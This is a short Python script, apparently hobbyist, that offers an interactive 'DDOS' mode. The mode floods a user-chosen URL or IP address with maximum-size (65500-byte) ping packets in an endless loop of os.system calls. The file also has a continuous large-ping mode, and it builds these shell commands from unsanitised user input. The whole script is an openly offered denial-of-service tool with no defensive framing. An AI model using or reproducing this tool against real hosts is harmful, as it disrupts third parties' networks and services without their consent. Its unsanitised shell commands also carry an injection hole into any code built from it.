import os
from colorama import Fore, init
import time

def clear():        #Has to be definied here.
    os.system('cls')        #For Linux: os.system('clear').

init()      #Does some colorama shit idk?

DDOS_String = None

clear()

#Simple warning sequence
print(Fore.RED + '[-] WARNING: DDOS MAY USE A LOT OF CPU!!')
time.sleep(5)
clear()


def ping_func():         #Easy setup for the ping function.
    load = input('[+] Enter the amount of bytes to ping with (1 - 65500): ')
    target = input('[+] Enter the url/IP address of the target: ')
    cont = input('[+] Continuous (Y/N): ')

    input('[+] Press enter to run. ')

    if cont.lower() == 'y':
        ping_string = str(f'ping {target} -l {load} -t')
    else:
        ping_string = str(f'ping {target} -l {load}')

    os.system(ping_string)

    ping_finish()


def DDOS_func():         #Easy setup for the DDOS function.
    global DDOS_string

    target = input('[+] Enter the url/IP address of the target: ')
    load = 65500
    timeout = input('[+] Set timeout in milliseconds (Enter "no" to set no timeout)(Reccomended max: 500): ')

    if timeout.lower() == 'no':
        DDOS_string = str(f'ping {target} -l {load} -n 1')
    else:
        timeout = str(timeout)
        DDOS_string = str(f'ping {target} -l {load} -n 1 -w {timeout}')     #-l = load, -w = timeout, -n = tries (useful for fast-paced spam).


def ping_finish():      #That doesn't need a who function. Oh well.
    print('[+] Ping finished.')
    input('')
    clear()


while True:         #Constantly loop so you cannot enter a mode that doesn't exist.
    print('[-] (d) DDOS.\n[-] (p) Ping.')
    mode = input('\n[+] Enter the mode you want to use (D/P): ')

    print('\n\n[+] Starting...')
    time.sleep(1)
    clear()

    if mode.lower() == 'd':
        DDOS_func()
        input('[+] Press enter to start. ')
        while True:         #This is where shit goes down, boys. ~Eddie, 03:26 02/01/2022 (EU date format)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
            os.system(DDOS_string)
        ping_finish()
    if mode.lower() == 'p':
        ping_func()
    else:
        clear()
        print('[-] Enter an existing mode.')